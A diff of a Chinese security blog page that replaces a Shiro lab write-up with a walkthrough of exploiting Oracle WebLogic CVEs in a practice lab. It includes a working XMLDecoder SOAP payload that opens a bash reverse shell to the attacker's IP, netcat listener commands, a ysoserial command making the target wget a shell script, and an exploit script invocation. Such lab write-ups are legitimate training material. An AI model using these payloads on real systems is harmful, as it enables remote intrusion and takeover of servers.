@@ -11,7 +11,7 @@
         name="viewport"
         content="width=device-width, initial-scale=1, maximum-scale=1"
       />
-      <title>vulnhub--shiro |  unevensails&#39;s blog</title>
+      <title>vulnhub--weblogic |  unevensails&#39;s blog</title>
   <meta name="generator" content="hexo-theme-ayer">
       
       <link rel="shortcut icon" href="/favicon.ico" />
@@ -54,7 +54,7 @@
     <main class="content on">
       <section class="outer">
   <article
-  id="post-vulnhub--shiro"
+  id="post-vulnhub--weblogic"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
@@ -65,7 +65,7 @@
     <header class="article-header">
        
 <h1 class="article-title sea-center" style="border-left:0" itemprop="name">
-  vulnhub--shiro
+  vulnhub--weblogic
 </h1>
  
 
@@ -73,8 +73,8 @@
     </header>
      
     <div class="article-meta">
-      <a href="/2022/09/05/vulnhub--shiro/" class="article-date">
-  <time datetime="2022-09-05T13:23:05.000Z" itemprop="datePublished">2022-09-05</time>
+      <a href="/2022/09/08/vulnhub--weblogic/" class="article-date">
+  <time datetime="2022-09-08T01:53:09.000Z" itemprop="datePublished">2022-09-08</time>
 </a> 
   <div class="article-category">
     <a class="article-category-link" href="/categories/vulnhub/">vulnhub</a>
@@ -85,7 +85,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> Word count:</span>
-            <span class="post-count">221</span>
+            <span class="post-count">454</span>
         </span>
     </span>
 
@@ -94,7 +94,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> Reading time≈</span>
-            <span class="post-count">1 min</span>
+            <span class="post-count">2 min</span>
         </span>
     </span>
 </div>
@@ -109,8 +109,52 @@
   
     <div class="article-entry" itemprop="articleBody">
        
-  <h5 id="CVE-2016-4437-反序列化"><a href="#CVE-2016-4437-反序列化" class="headerlink" title="CVE-2016-4437 反序列化"></a>CVE-2016-4437 反序列化</h5><p>猜测：<br>进入靶场之后发现是个登录框，bp抓包，在历史记录中发现了rememberMe，怀疑存在shiro反序列化漏洞<br><img src="https://image.3001.net/images/20220905/1662376550_6315da6630132f0c8fc6c.png!small"><br>验证猜测：<br>先在bp项目选项处设置使用默认的burp collaborator服务器<br><img src="https://image.3001.net/images/20220905/1662376745_6315db29990aefa7fb978.png!small"><br>接下来点击bp左上角的burp-&gt;burp collaborator客户端<br><img src="https://image.3001.net/images/20220905/1662376910_6315dbce3b7b1d74a9829.png!small"><br>复制生成的dnslog的url<br><img src="https://image.3001.net/images/20220905/1662377014_6315dc366575dade76469.png!small"><br>用python脚本生成dnslog记录的payload<br><img src="https://image.3001.net/images/20220905/1662377215_6315dcffbc6bd70b35327.png!small"><br>复制payload，构造cookie，发至重发模块点击发送<br><img src="https://image.3001.net/images/20220905/1662377378_6315dda22087cfb7b7112.png!small"><br>成功接收到dnslog记录，猜测正确<br><img src="https://image.3001.net/images/20220905/1662377657_6315deb9ee3a364bff3f9.png!small"><br>利用漏洞：<br>打开反序列化漏洞利用工具，输入url，点击爆破密钥和爆破利用链及回显<br><img src="https://image.3001.net/images/20220905/1662377945_6315dfd932fac5be599c0.png!small"><br>点击命令执行，输入whoami，成功执行<br><img src="https://image.3001.net/images/20220905/1662378015_6315e01f5835a4a8e8939.png!small"></p>
-<h5 id="CVE-2020-1957-未授权访问"><a href="#CVE-2020-1957-未授权访问" class="headerlink" title="CVE-2020-1957 未授权访问"></a>CVE-2020-1957 未授权访问</h5><p>进入靶场，随便点了一下就302跳转到登录页面了<br><img src="https://image.3001.net/images/20220905/1662383261_6315f49d4da6cdafd11fa.png!small"><br>bp抓包，在响应包中发现rememberMe<br><img src="https://image.3001.net/images/20220905/1662383489_6315f581d4c7a91188720.png!small"><br>构造url，成功登录到管理界面<br><img src="https://image.3001.net/images/20220905/1662384047_6315f7afc15090399b115.png!small"></p>
+  <h5 id="CVE-2017-10271-XMLDecoder反序列化"><a href="#CVE-2017-10271-XMLDecoder反序列化" class="headerlink" title="CVE-2017-10271 XMLDecoder反序列化"></a>CVE-2017-10271 XMLDecoder反序列化</h5><p>进入靶场</p>
+<p><img src="https://image.3001.net/images/20220908/1662638159_6319d84fb9cc3e60f13a3.png!small"></p>
+<p>点击链接，抓包，变更post请求方式，构造poc</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt; &lt;soapenv:Header&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span><br><span class="line">&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;</span><br><span class="line">&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;</span><br><span class="line">&lt;void index=&quot;0&quot;&gt;</span><br><span class="line">&lt;string&gt;/bin/bash&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;1&quot;&gt;</span><br><span class="line">&lt;string&gt;-c&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;2&quot;&gt;</span><br><span class="line">&lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.103.134/4444 0&amp;gt;&amp;amp;1&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;/array&gt;</span><br><span class="line">&lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;</span><br><span class="line">&lt;/java&gt;</span><br><span class="line">&lt;/work:WorkContext&gt;</span><br><span class="line">&lt;/soapenv:Header&gt;</span><br><span class="line">&lt;soapenv:Body/&gt;</span><br><span class="line">&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure>
+
+<p>反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python2 -m SimpleHTTPServer 80</span><br><span class="line">nc -nvlp 4444</span><br></pre></td></tr></table></figure>
+
+<p>将数据包传至重发模块，点击发送</p>
+<p><img src="https://image.3001.net/images/20220908/1662638187_6319d86b3fdb668f4901b.png!small"></p>
+<p>注：报错415，需要修改Content-Type:text/xml;charset=utf-8</p>
+<p>成功反弹shell</p>
+<p><img src="https://image.3001.net/images/20220908/1662638202_6319d87a4fe7f6deda6b5.png!small"></p>
+<h5 id="cve-2018-2628-反序列化"><a href="#cve-2018-2628-反序列化" class="headerlink" title="cve-2018-2628 反序列化"></a>cve-2018-2628 反序列化</h5><p>攻击机ip：192.168.103.134</p>
+<p>靶机ip：192.168.103.112</p>
+<p>启动靶场</p>
+<p><img src="https://image.3001.net/images/20220908/1662638248_6319d8a8df39cc2689b3c.png!small"></p>
+<p>创建shell.sh文件准备反弹shell</p>
+<p><img src="https://image.3001.net/images/20220908/1662638266_6319d8ba011b6267b9f9f.png!small"></p>
+<p>开启http服务</p>
+<p><img src="https://image.3001.net/images/20220908/1662638278_6319d8c6e6c67a3cf4087.png!small"></p>
+<p>开启JRMPListener</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 &#x27;wget 192.168.103.134/shell.sh&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20220908/1662638292_6319d8d4b4085a02f6ce2.png!small"></p>
+<p>执行poc脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 exploit.py 192.168.103.112 7001 ysoserial-0.0.6-SNAPSHOT-BETA-all.jar 192.168.103.134 1099 JRMPClient</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20220908/1662638304_6319d8e07efac8a7652bd.png!small"><br>成功下载shell.sh</p>
+<p><img src="https://image.3001.net/images/20220908/1662638316_6319d8ec2927fe30c21ad.png!small"></p>
+<p>开启监听端口</p>
+<p><img src="https://image.3001.net/images/20220908/1662638326_6319d8f6c6259c327dc85.png!small"></p>
+<p>再次执行JRMPListener和poc脚本反弹shell</p>
+<p><img src="https://image.3001.net/images/20220908/1662638341_6319d905e94c331ff5157.png!small"></p>
+<p><img src="https://image.3001.net/images/20220908/1662638353_6319d911f15d2d6528825.png!small"></p>
+<p>成功反弹</p>
+<p><img src="https://image.3001.net/images/20220908/1662638367_6319d91fafb46c615cc83.png!small"></p>
+<h5 id="cve-2018-2894-文件上传"><a href="#cve-2018-2894-文件上传" class="headerlink" title="cve-2018-2894 文件上传"></a>cve-2018-2894 文件上传</h5><p>进入靶场，找到漏洞利用点，修改工作路径</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20220908/1662638383_6319d92f48eac50e5632f.png!small"></p>
+<p>bp抓包，传至重发模块发送，可以发现时间戳</p>
+<p><img src="https://image.3001.net/images/20220908/1662638404_6319d94404038bad1feb4.png!small"><br>访问路径，上传成功</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">路径  http://your-ip:7001/ws_utc/css/config/keystore/[时间戳]_[文件名]</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20220908/1662638419_6319d953c48f674cec159.png!small"></p>
  
       <!-- reward -->
       
@@ -175,7 +219,7 @@
     <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://unevensails.github.io/2022/09/05/vulnhub--shiro/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://unevensails.github.io/2022/09/08/vulnhub--weblogic/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -188,19 +232,19 @@
    
   <nav class="article-nav">
     
-      <a href="/2022/09/08/vulnhub--weblogic/" class="article-nav-link">
+      <a href="/2022/09/08/vulnhub--jboss/" class="article-nav-link">
         <strong class="article-nav-caption">上一篇</strong>
         <div class="article-nav-title">
           
-            vulnhub--weblogic
+            vulnhub--jboss
           
         </div>
       </a>
     
     
-      <a href="/2022/08/26/msf%E8%81%94%E5%8A%A8cs/" class="article-nav-link">
+      <a href="/2022/09/05/vulnhub--shiro/" class="article-nav-link">
         <strong class="article-nav-caption">下一篇</strong>
-        <div class="article-nav-title">msf联动cs</div>
+        <div class="article-nav-title">vulnhub--shiro</div>
       </a>
     
   </nav>
